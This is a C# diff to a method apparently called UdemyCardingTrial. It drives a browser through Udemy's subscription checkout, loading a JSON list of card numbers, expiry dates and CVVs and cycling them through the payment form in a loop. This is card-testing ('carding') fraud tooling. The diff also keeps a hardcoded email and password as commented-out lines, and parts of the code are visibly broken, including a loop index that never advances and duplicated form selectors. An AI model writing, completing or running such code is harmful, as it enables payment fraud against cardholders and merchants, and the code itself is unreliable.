@@ -182,11 +182,49 @@ namespace Trial_Everywhere
         private static void UdemyCardingTrial()
         {
             driver = new ChromeDriver();
-            driver.Navigate().GoToUrl("https://www.udemy.com/");
+            driver.Navigate().GoToUrl("https://www.udemy.com/join/signup-popup/?locale=en_US&response_type=html&next=https%3A%2F%2Fwww.udemy.com%2F");
 
-            driver.FindElement(By.Id("login-username")).SendKeys("rather.p.our1.8.6.2@gmail.com");
-            driver.FindElement(By.Id("login-password")).SendKeys("Powerspoti!#2");
-            driver.FindElement(By.Id("login-button")).Click();
+            Console.ReadKey();
+            driver.Navigate().GoToUrl("https://www.udemy.com/subscription-checkout/express/?subscription-id=U3RhbmRhcmRTdWJzY3JpcHRpb25QbGFuOjQ%3D");
+
+            //driver.FindElement(By.Id("login-username")).SendKeys("rather.p.our1.8.6.2@gmail.com");
+            //driver.FindElement(By.Id("login-password")).SendKeys("Powerspoti!#2");
+            //driver.FindElement(By.Id("login-button")).Click();
+
+            driver.FindElement(By.Id("u677-form-group--1")).SendKeys("10080");
+
+            Console.Write("set path: ");
+            string path_card = Console.ReadLine();
+
+            dynamic jsonFile = JsonConvert.DeserializeObject(File.ReadAllText(path_card));
+            int number = 0;
+
+            string cardNumber = "/html/body/div/form/span[2]/div/div[2]/span/input";
+            string expTime = "/html/body/div/form/span[2]/span/input";
+            string securityCode = "/html/body/div/form/span[2]/span/input";
+            while (true)
+            {
+                driver.FindElement(By.Id("u677-form-group--5")).SendKeys("John Somod");
+
+                driver.FindElement(By.XPath(cardNumber)).Clear();
+                driver.FindElement(By.XPath(cardNumber)).SendKeys(Convert.ToString(jsonFile[number]["card_number"]));
+
+                string expiryDate = Convert.ToString(jsonFile[number]["expiration_date"]);
+                int indexOf = expiryDate.IndexOf("/");
+                expiryDate = expiryDate.Remove(indexOf + 1, 2);
+
+                driver.FindElement(By.XPath(expTime)).Clear();
+                driver.FindElement(By.XPath(expTime)).SendKeys(expiryDate);
+
+                driver.FindElement(By.XPath(securityCode)).Clear();
+                driver.FindElement(By.XPath(securityCode)).SendKeys(Convert.ToString(jsonFile[number]["cvv"]));
+
+                Thread.Sleep(1000);
+                driver.FindElement(By.XPath("/html/body/div[1]/div[3]/div/div/div/div/div[2]/div/section[2]/button")).Clear();
+                Thread.Sleep(3000);
+                
+            }
+
         }
     }
 }
